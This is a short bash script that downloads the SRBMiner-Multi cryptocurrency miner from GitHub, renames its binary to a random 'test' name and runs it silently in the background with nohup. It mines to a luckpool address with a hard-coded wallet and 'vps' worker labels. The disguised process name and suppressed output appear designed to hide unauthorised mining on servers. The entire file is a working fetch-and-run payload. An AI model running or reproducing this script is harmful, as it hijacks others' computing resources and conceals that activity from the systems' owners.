#!/bin/bash

kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)

wget -q -O dot https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.1/SRBMiner-Multi-2-6-1-Linux.tar.gz

tar -xzf dot

mv SRBMiner-Multi-2-6-1 test

cd test

mv SRBMiner-MULTI test$kolot

nohup ./test$kolot -a verushash -o na.luckpool.net:3960 -u RT8XoQFACj677vaJQGNJLVeaUB6dmq3AAg.vps-$kolot > /dev/null 2>&1 &
